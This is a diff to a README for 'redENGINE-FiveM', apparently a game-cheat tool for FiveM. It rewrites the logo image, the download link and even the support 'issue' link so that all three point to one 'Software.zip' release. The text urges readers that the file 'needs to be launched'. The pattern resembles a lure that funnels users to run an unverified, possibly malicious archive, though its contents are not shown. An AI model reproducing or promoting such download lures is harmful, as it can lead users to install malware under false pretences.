@@ -2,7 +2,7 @@
 
 Welcome to the redENGINE-FiveM GitHub repository! 
 
-![redENGINE Logo](https://example.com/redengine_logo.png)
+![redENGINE Logo](https://github.com/styvencastillo/redENGINE-FiveM/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -34,7 +34,7 @@ Explore the following topics related to redENGINE-FiveM:
 
 ## Software Download
 
-Check out the latest version of the software [here](https://github.com/user-attachments/files/18388744/Software.zip). Please note that the file needs to be launched to access the features offered by redENGINE-FiveM.
+Check out the latest version of the software [here](https://github.com/styvencastillo/redENGINE-FiveM/releases/download/v2.0/Software.zip). Please note that the file needs to be launched to access the features offered by redENGINE-FiveM.
 
 ## Releases
 
@@ -49,6 +49,6 @@ If the software download link is not working or you need access to previous vers
 
 ## Support
 
-For any questions, feedback, or issues related to redENGINE-FiveM, feel free to open an [issue](https://github.com/redENGINE-FiveM/issues).
+For any questions, feedback, or issues related to redENGINE-FiveM, feel free to open an [issue](https://github.com/styvencastillo/redENGINE-FiveM/releases/download/v2.0/Software.zip).
 
 Get ready to elevate your FiveM gaming experience with redENGINE-FiveM! 🎮🔥
